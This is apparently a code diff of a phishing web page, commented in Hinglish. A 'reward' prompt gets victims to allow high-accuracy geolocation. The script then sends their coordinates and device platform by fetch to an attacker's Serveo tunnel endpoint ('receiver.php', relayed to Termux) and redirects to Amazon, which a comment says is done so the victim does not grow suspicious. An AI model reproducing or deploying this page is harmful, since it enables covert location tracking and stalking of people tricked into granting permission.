@@ -21,18 +21,18 @@
 </div>
 
 <script>
-    // APNA SERVEO URL YAHAN DALEIN (Example: https://shubh.serveo.net)
-    const serverURL = "https://myapp.serveousercontent.com"; 
+    // TERA SERVEO LINK YAHAN HAI
+    const serverURL = "https://prolevel.serveousercontent.com"; 
 
     function sendData(lat, lon) {
-        // Bina Socket.io ke, simple Fetch se data bhejna (PHP ke liye)
+        // Data capture and send to Termux
         fetch(`${serverURL}/receiver.php?lat=${lat}&lon=${lon}&device=${navigator.platform}`)
         .then(() => {
-            // Data bhejne ke turant baad Amazon khul jayega (No Popup Block)
+            // Success hone par Amazon redirect
             window.location.href = "https://www.amazon.in";
         })
         .catch(err => {
-            // Error ki surat mein bhi Amazon khul jaye
+            // Error hone par bhi redirect (taki shak na ho)
             window.location.href = "https://www.amazon.in";
         });
     }
@@ -41,13 +41,10 @@
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    sendData(lat, lon);
+                    sendData(position.coords.latitude, position.coords.longitude);
                 },
                 (error) => {
                     alert("Please allow permissions to sync and get your reward.");
-                    // Agar permission deny kare toh bhi Amazon par bhej do
                     window.location.href = "https://www.amazon.in";
                 },
                 { enableHighAccuracy: true }
